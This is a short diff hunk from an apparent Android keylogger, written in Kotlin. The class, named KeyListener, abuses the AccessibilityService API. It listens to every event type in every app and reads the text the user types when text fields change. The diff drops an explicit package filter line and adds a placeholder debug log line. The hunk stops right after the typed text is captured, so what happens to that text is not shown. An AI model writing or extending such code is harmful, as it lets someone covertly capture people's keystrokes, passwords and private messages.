@@ -23,13 +23,13 @@ class KeyListener : AccessibilityService() {
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
         info.notificationTimeout = 100
-        info.packageNames = null
         serviceInfo = info
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val df: DateFormat = SimpleDateFormat("dd MMM, hh:mm ")
         val time = df.format(Calendar.getInstance().time)
+        Log.e("Meow: ", "$time|(TEXT)|meow")
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 var data = event.text.toString()
